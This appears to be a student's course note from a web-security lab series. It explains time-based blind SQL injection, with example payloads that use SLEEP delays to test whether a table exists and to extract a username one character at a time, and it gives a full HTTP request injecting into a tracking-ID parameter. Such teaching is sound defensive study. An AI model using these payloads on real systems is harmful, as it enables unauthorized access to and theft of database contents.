---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Extracting Data Using Time-Based Blind SQL Injection

Once the vulnerability is confirmed, the next step is to extract data from the database using time-based Blind SQL Injection.

### Determining the Database Schema

To extract data, we first need to determine the structure of the database. This can be done by injecting SQL code that causes time delays based on the existence of certain tables or columns.

#### Example: Checking Table Existence

```sql
SELECT * FROM users WHERE id = '1' AND IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users'), SLEEP(10), 0)
```

If the response is delayed by 10 seconds, it confirms that the `users` table exists.

### Extracting Data Row by Row

Once the schema is known, we can extract data row by row. For example, to extract the username from the `users` table:

#### Example: Extracting Username

```sql
SELECT * FROM users WHERE id = '1' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(10), 0)
```

By iterating through each character position and checking for a delay, we can reconstruct the username.

### Complete Example

Here is a complete example of extracting a username using time-based Blind SQL Injection:

```http
GET /api/tracking?trackingID=1' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(10), 0) -- HTTP/1.1
Host: vulnerablewebapp.com
```

Repeat this process for each character position until the entire username is reconstructed.

---
<!-- nav -->
[[04-Exploiting the Vulnerability|Exploiting the Vulnerability]] | [[Web Security (PortSwigger)/02-SQL Injection/14-Lab 13 Blind SQL injection with time delays/00-Overview|Overview]] | [[06-How to Prevent  Defend Against Blind SQL Injection|How to Prevent  Defend Against Blind SQL Injection]]
